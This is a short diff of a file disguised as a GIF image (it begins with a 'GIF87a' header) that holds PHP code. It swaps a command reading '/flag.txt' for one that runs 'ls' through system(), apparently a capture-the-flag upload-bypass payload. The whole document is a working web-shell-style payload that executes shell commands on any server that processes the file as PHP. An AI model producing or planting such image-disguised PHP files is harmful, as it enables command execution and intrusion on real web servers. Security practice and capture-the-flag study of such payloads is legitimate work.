@@ -1,5 +1,5 @@
 GIF87a
 
 <?php
-system("cat /flag.txt");
+echo system("ls");
 ?>
